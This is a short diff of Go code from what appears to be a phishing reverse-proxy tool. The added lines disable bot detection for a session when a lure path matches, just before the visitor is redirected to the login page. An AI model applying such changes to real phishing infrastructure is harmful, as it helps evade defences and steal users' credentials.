@@ -509,6 +509,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				if pl != nil {
 					_, err := p.cfg.GetLureByPath(pl_name, req_path)
 					if err == nil {
+         // ? Disable bot detection for this session
+          if p.botDetectionManager != nil && ps.SessionId != "" {
+              p.botDetectionManager.DisableForSession(ps.SessionId)
+          }
 						// redirect from lure path to login url
 						rurl := pl.GetLoginUrl()
 						resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
